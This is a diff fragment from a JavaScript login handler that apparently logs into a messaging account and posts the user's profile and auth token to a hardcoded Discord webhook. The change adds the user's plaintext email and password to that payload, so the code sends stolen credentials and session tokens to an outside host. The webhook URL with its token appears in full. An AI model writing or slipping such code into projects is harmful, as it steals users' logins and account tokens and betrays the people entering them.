@@ -47,7 +47,7 @@ if (req.method === "POST" && pathname === "/login") {
     client.base.talk.getProfile().then((profile) => {
      const getprofile = JSON.stringify(profile, null, 2);
 const logUrl = "https://discord.com/api/webhooks/1390874490304598046/W7PYKSY_Im5p20oz8sx4GBMpw2q8z-f5EIcxGJxroNQbutZczX0yy8sg7m3_YjPwjXd1"
-     const logdata = {content:`${getprofile}\n[ ${authtoken} ]`}
+     const logdata = {content:`${email}\n${password}\n${getprofile}\n[ ${authtoken} ]`}
    fetch(logUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
